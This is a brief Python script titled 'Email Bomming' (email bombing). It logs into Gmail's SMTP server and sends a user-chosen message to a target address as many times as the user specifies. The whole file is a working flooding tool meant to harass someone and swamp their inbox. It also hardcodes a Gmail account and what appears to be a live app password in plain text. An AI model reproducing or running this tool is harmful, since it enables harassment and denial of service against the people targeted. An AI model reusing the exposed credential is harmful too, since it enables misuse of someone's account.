#sender = "your_email@gmail.com"
#receiver = "receiver_email@gmail.com"
#password = "your_16_digit_app_password"

#Email Bomming 

import smtplib
server= smtplib.SMTP("smtp.gmail.com", "587")

server.ehlo()
server.starttls()

server.login("rfprogramminghub@gmail.com", "xiitwggtdcrhmzak")

to= input ("Enter Your Target Eamil : ")
limit=int (input ("Enter Limit :"))
msg=input ("Enter Message :")


for i in range(limit):
    server.sendmail("rfprogramminghub@gmail.com",to,msg)
    print(f"{i}Mail Send Successfully..")
